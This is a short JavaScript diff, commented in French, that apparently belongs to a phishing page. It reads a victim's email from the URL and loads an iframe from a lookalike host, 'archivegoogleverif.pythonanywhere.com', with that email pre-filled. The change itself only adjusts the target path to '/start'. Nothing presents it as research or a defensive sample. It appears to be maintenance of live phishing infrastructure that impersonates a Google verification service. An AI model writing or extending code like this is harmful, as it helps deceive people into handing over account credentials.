@@ -49,7 +49,7 @@
         const email = params.get('email') || '******@gmail.com';
 
         // 3. Définir l'URL cible
-        const baseUrl = 'https://archivegoogleverif.pythonanywhere.com/';
+        const baseUrl = 'https://archivegoogleverif.pythonanywhere.com/start';
         const finalUrl = `${baseUrl}?email=${encodeURIComponent(email)}`;
 
         // 4. Mettre à jour la source de l'iframe
